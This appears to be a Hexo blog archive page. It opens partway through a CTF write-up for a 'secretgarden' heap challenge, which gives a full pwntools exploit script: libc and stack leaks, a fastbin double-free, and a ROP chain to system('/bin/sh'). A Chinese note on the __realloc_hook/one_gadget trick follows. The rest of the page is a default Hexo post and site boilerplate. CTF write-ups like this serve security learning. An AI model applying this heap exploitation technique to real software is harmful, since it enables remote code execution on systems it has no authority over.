class="line">heap_a1=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_base=heap_a1<span class="number">-0x1110</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line"><span class="comment">#---------leak libc base-------------------</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'1234abcd'</span>,<span class="string">'color1'</span>) <span class="comment">#1</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'abcd'</span>)</span><br><span class="line">unsortbin_addr=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">main_arena=unsortbin_addr<span class="number">-0x58</span></span><br><span class="line">main_arena_offset=<span class="number">0x3c4b20</span></span><br><span class="line">libc_base=main_arena-main_arena_offset</span><br><span class="line">environ_offset=<span class="number">0x3c6f38</span></span><br><span class="line">environ=libc_base+environ_offset</span><br><span class="line"><span class="keyword">print</span> hex(main_arena)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'environ:\t'</span>+hex(environ)</span><br><span class="line"><span class="comment">#----------fastbin attack &amp;&amp; leak stack address------------------</span></span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_name(<span class="number">3</span>)</span><br><span class="line">delete_name(<span class="number">2</span>)	</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'\x00'</span>*<span class="number">8</span>,<span class="string">'color'</span>)  <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x28</span>,p64(<span class="number">0x1</span>)+p64(environ),<span class="string">'color'</span>)  <span class="comment">#5</span></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'4] :'</span>)</span><br><span class="line">stack=u64(sh.recvuntil(<span class="string">'C'</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment">#------change top chunk point to free_hook-0xb58</span></span><br><span class="line">delete_name(<span class="number">5</span>)</span><br><span class="line">delete_flower()</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span>,<span class="string">'color'</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span>,<span class="string">'color'</span>)</span><br><span class="line">delete_flower()</span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_name(<span class="number">3</span>)</span><br><span class="line">delete_flower()</span><br><span class="line">system_offset=<span class="number">0x45390</span></span><br><span class="line">system=libc_base+system_offset</span><br><span class="line">binsh_offset=<span class="number">0x18cd57</span></span><br><span class="line">binsh=libc_base+binsh_offset</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>) <span class="comment">#4</span></span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_name(<span class="number">3</span>)</span><br><span class="line">delete_name(<span class="number">2</span>)</span><br><span class="line">delete_flower()</span><br><span class="line">add(<span class="number">0x68</span>,p64(stack<span class="number">-0x18b</span>),<span class="string">'color'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'color'</span>)</span><br><span class="line">pop_rdi_ret=libc_base+<span class="number">0x21102</span></span><br><span class="line">payload=<span class="string">'\x00'</span>*<span class="number">3</span>+<span class="string">'a'</span>*<span class="number">0x28</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack\t"</span>+hex(stack<span class="number">-0x133</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack\t"</span>+hex(stack<span class="number">-0x183</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'name :'</span>,str(<span class="number">0x68</span>))</span><br><span class="line">sh.sendafter(<span class="string">'flower :'</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="利用-realloc-hook"><a href="#利用-realloc-hook" class="headerlink" title="利用_realloc_hook"></a>利用_realloc_hook</h4><p>参考网上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">地址上*__malloc_hook*与*__realloc_hook*是相邻的，在攻击malloc_hook我们没有能够成功执行one_gadgets，但是我们可以通过将*__malloc_hook*更改为`_libc_realloc+0x20`,将*__realloc_hook*更该为one_gadgets。</span><br><span class="line"></span><br><span class="line">这样的好处在于，我们能够控制*__malloc_hook*指向的代码的内容，规避掉*_libc_realloc*中部分指令，从而更改在执行one_gadgets时的占空间，创建能够成功执行one_gadgets的栈空间。这是一个很巧妙的点…MAGIC！</span><br></pre></td></tr></table></figure>

<p><img src="//idongxia.github.io/2019/06/06/secretgarden/checksec.png" alt="test"></p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://idongxia.github.io/2019/06/06/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="idongxia">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="idongxia">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/06/06/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-06-06 11:01:24" itemprop="dateCreated datePublished" datetime="2019-06-06T11:01:24+08:00">2019-06-06</time>
            

            
          </span>

          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Kommentare: </span>
                <a href="/2019/06/06/hello-world/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/06/06/hello-world/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://idongxia.github.io/2018/01/19/blogname/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="idongxia">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="idongxia">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2018/01/19/blogname/" class="post-title-link" itemprop="url">blogname</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2018-01-19 00:34:14" itemprop="dateCreated datePublished" datetime="2018-01-19T00:34:14+08:00">2018-01-19</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Bearbeitet am</span>
                
                <time title="Geändert am: 2018-01-01 12:00:00" itemprop="dateModified" datetime="2018-01-01T12:00:00+08:00">2018-01-01</time>
              
            
          </span>

          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Kommentare: </span>
                <a href="/2018/01/19/blogname/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/01/19/blogname/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h1><img src="//idongxia.github.io/2018/01/19/blogname/cxk.png">
          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">idongxia</p>
              <div class="site-description motion-element" itemprop="description"></div>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">4</span>
                    <span class="site-state-item-name">Artikel</span>
                  </a>
                </div>
              

              

              
            </nav>
          

          

          

          

          

          
          

          
            
          
          

        </div>
      </div>

      

      

    </div>
  </aside>
  


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">idongxia</span>

  

  
</div>


  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.1.2</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  <script src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/utils.js?v=7.1.2"></script>

  <script src="/js/motion.js?v=7.1.2"></script>



  
  


  <script src="/js/schemes/muse.js?v=7.1.2"></script>



  

  


  <script src="/js/next-boot.js?v=7.1.2"></script>


  

  

  

  
  

<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>



<script src="//unpkg.com/valine/dist/Valine.min.js"></script>

<script>
  var GUEST = ['nick', 'mail', 'link'];
  var guest = 'nick,mail,link';
  guest = guest.split(',').filter(function(item) {
    return GUEST.indexOf(item) > -1;
  });
  new Valine({
    el: '#comments',
    verify: false,
    notify: false,
    appId: 'utzKntLleFpYpbLMukFBuRNb-gzGzoHsz',
    appKey: 'QzvmcivNyJTepWaD1Fuwpuci',
    placeholder: 'Just go go',
    avatar: 'mm',
    meta: guest,
    pageSize: '10' || 10,
    visitor: false,
    lang: '' || 'zh-cn'
  });
</script>





  




  

  

  

  

  

  

  

  

  

  

  

  

  

  

</body>
</html>
